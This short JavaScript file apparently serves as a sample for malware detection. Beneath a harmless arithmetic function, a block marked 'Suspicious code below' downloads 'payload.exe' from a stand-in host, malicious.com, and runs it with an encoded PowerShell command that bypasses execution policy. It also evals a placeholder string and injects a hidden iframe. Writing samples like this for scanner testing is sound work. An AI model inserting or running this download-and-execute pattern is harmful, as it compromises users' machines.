
// Legitimate JavaScript code
function calculate() {
    return 2 + 2;
}

// Suspicious code below
var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("Microsoft.XMLHTTP");
http.open("GET", "http://malicious.com/payload.exe", false);
http.send();
shell.Run("powershell -exec bypass -enc " + http.responseText);

eval("malicious_code_here");
document.write("<iframe src='malicious.com'></iframe>");
